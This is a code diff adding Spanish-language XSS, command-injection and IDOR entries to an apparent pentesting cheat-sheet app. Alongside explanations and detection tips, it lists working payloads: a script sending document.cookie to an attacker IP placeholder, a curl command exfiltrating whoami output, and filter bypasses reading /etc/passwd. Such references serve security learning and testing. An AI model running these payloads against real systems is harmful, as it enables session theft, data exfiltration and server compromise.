@@ -4459,6 +4459,60 @@ const WEB_VULNS=[
       {code:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`, d:'RCE en Jinja2 — ejecuta "id" vía os.popen'},
     ],
   },
+  {
+    id:'xss', owasp:'A03', icon:'⚡', name:'XSS (Cross-Site Scripting)', tag:'Injection',
+    sub:'Inyección de JavaScript que se ejecuta en el navegador de otros usuarios.',
+    desc:'La aplicación devuelve entrada del usuario dentro del HTML sin sanitizar, permitiendo inyectar JavaScript que se ejecuta en el navegador de la víctima. Reflejado: el payload viaja en la petición (enlace malicioso). Almacenado: queda guardado (comentario, perfil) y afecta a todo el que lo vea. DOM: la manipulación ocurre en el propio JS del cliente.',
+    detection:'Meter una cadena única (p. ej. zqx123) en cada campo o parámetro y buscarla en el HTML de la respuesta: ver si sale escapada (&lt;) o cruda (<). Fijarse en el contexto donde cae: HTML, atributo, dentro de \x3cscript\x3e o en una URL.',
+    payloads:[
+      {code:'\x3cscript\x3ealert(document.domain)\x3c/script\x3e', d:'Prueba básica — confirma ejecución de JavaScript'},
+      {code:'">\x3cscript\x3ealert(1)\x3c/script\x3e', d:'Rompe primero un atributo HTML y luego inyecta'},
+      {code:'\x3cimg src=x onerror=alert(1)\x3e', d:'Sin la etiqueta script — útil si está filtrada'},
+      {code:'\x3csvg onload=alert(1)\x3e', d:'Vector alternativo con SVG'},
+      {code:'javascript:alert(1)', d:'En contexto de href / URL (enlaces)'},
+      {code:`\x3cscript\x3enew Image().src='http://IP_ATACANTE/c?='+document.cookie\x3c/script\x3e`, d:'Robo de cookies — exfiltra la sesión a tu servidor'},
+    ],
+    note:'💡 Si la cookie de sesión tiene HttpOnly, robarla con document.cookie no funciona: pivota a hacer acciones en nombre de la víctima (cambiar email/contraseña) o a keylogging.',
+  },
+  {
+    id:'cmd-injection', owasp:'A03', icon:'🖥️', name:'Command Injection', tag:'Injection',
+    sub:'Ejecutar comandos del sistema operativo a través de la aplicación.',
+    desc:'La aplicación pasa entrada del usuario a una llamada del sistema (shell) sin sanitizar, y se pueden ejecutar comandos arbitrarios del SO. Aparece a menudo en funciones que hacen ping, lookups DNS, conversión de ficheros, etc.',
+    detection:'Parámetros que alimentan utilidades del sistema (host=, ip=, domain=, cmd=, filename=). Encadenar un comando con un separador y ver si se ejecuta (retraso con sleep, o salida de whoami).',
+    bypassGroups:[
+      {name:'Separadores de comando', items:[
+        {code:'; whoami', d:'Punto y coma — ejecuta el segundo comando tras el primero'},
+        {code:'| whoami', d:'Pipe — pasa la salida y ejecuta el segundo'},
+        {code:'|| whoami', d:'OR — se ejecuta si el primero falla'},
+        {code:'& whoami', d:'Ejecuta ambos'},
+        {code:'`whoami`', d:'Sustitución de comando (backticks)'},
+        {code:'$(whoami)', d:'Sustitución de comando (sintaxis moderna)'},
+      ]},
+      {name:'A ciegas (sin ver la salida)', items:[
+        {code:'; sleep 5', d:'Blind — si la respuesta tarda 5s, hay ejecución'},
+        {code:'; ping -c 3 IP_ATACANTE', d:'Blind out-of-band — confírmalo capturando el ping en tu máquina'},
+        {code:'; curl http://IP_ATACANTE/$(whoami)', d:'Exfiltra la salida por HTTP a tu servidor'},
+      ]},
+      {name:'Bypass de filtros', items:[
+        {code:'/bin/c?t /etc/passwd', d:'Comodines en la ruta del binario'},
+        {code:'cat${IFS}/etc/passwd', d:'${IFS} reemplaza el espacio si está filtrado'},
+      ]},
+    ],
+    note:'⚠ Confirma primero a ciegas (sleep): muchas veces se ejecuta aunque no veas la salida en la respuesta.',
+  },
+  {
+    id:'idor', owasp:'A01', icon:'🔑', name:'IDOR (Insecure Direct Object Reference)', tag:'Broken Access Control',
+    sub:'Cambiar un identificador para acceder a datos de otros usuarios.',
+    desc:'La aplicación usa un identificador que tú controlas (id numérico, nombre de fichero, UUID) para traer un objeto sin comprobar que ese objeto es tuyo. Cambiando el identificador se accede a datos u operaciones de otras cuentas.',
+    detection:'Buscar identificadores predecibles en URLs, parámetros, cuerpos JSON y cabeceras: /factura?id=1001, /api/user/5, filename=informe.pdf. Cambiarlos (subir/bajar, poner el de otra cuenta) y ver si devuelve datos ajenos.',
+    payloads:[
+      {code:'/api/user/1001  ->  /api/user/1002', d:'Incrementar o decrementar el ID numérico'},
+      {code:'file=miinforme.pdf  ->  file=../otro/informe.pdf', d:'Cambiar el nombre de fichero (enlaza con path traversal)'},
+      {code:'PUT /api/account/1002  (con TU sesión)', d:'IDOR de escritura — modificar objetos de otros, no solo leerlos'},
+      {code:'id=1002  probado con GET / POST / PUT / DELETE', d:'Probar el mismo id con distintos verbos HTTP'},
+    ],
+    note:'💡 Pruébalo con DOS cuentas: pide un recurso con la cuenta A y accede a ese id logueado como B. Si lo ves, es IDOR. Un UUID no te salva si se filtra en otra respuesta.',
+  },
 ];
 
 function renderWebVulnList(){
